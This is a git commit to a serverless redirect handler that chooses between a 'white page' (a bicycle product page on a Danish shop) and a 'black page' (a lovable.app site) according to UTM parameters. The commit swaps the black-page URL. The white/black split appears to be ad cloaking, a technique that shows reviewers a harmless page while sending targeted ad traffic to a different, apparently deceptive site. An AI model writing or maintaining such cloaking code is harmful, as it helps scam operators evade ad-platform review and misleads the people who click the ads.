c8c8ce180a6773f7e883ee5254668b4498400bba
Ahmadfarhan67 <123234895+Ahmadfarhan67@users.noreply.github.com>
2025-10-07 01:06:28 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
     const whitePageURL = "https://moovershop.dk/en/products/gron-cykel-4-hjul-gron";
-    const blackPageURL = "https://applecaslov.lovable.app/";
+    const blackPageURL = "https://csshhhggot.lovable.app/";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
